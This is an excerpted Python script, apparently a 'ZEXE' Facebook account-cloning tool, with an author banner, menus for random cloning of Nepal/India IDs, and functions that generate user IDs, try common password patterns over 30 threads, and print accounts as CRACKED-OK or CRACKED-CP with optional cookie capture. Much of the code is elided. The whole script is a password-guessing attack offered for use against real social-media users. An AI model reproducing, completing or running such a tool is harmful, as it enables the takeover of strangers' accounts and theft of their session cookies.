...
def banner():
    #os.system('clear')
    print(f"""   \033[32;1m                                           
\033[32;1m       ______ _______   __ _____ 
\033[32;1m      |___  /|  ___\ \ / /|  ___|
 \033[32;1m        / / | |__  \ V / | |__  
 \033[32;1m       / /  |  __| /   \ |  __| 
\033[32;1m      ./ /___| |___/ /^\ \| |___ 
\033[32;1m      \_____/\____/\/   \/\____/ 
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} AVINASH                {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}ZEXE ff             {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+8801841004250          {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/ZEXE-FF{N}    {H}  ║
...
def mainx():
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/ZEXE-FF/ZEXE-FF/blob/main/Permeation");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open  https://www.facebook.com/profile.php?id=100092181615565");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}ZEXE {P}Terminal ');os.system("xdg-open  https://www.facebook.com/profile.php?id=100092181615565");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.king.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open  https://www.facebook.com/profile.php?id=100092181615565");mainx()
def mainx2():
    os.system("clear")
    banner()
    ...
    print(f"{K} [{H}4{K}] {WHITE}Random Cloning {H}Nep/Ind")
...
def dupcutter():
    ...
    Error = input(f"{wt}{N}File Name {RED}:{H} ");print(led);print(f'{dot}Example   {RED}:{H} /sdcard/file.txt');print(led)
...
def xp():
  ...
  with tred(max_workers=30) as king_xd:
    ...
    for guru in user:
      idf = kode+guru
      pwv = [guru,'namecast','name cast','name123','name12','name1122']
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mCRACKED-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             ...
             break
                ...
                ok+=1
                print(f'\r{P} [{H}CRACKED-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [CRACKED-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mCRACKED-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
...
def m5(idf,pw):
 ...
 try:
  ...
  pass 
# INDIA X NEPAL -- MAIN DEF #

if __name__=='__main__':
  try:os.mkdir('ZEXE-FF')
  except:pass
  try:os.mkdir('FOR-WIFEE')
  except:pass
#  b2()
#  mainx() 
  mainx()
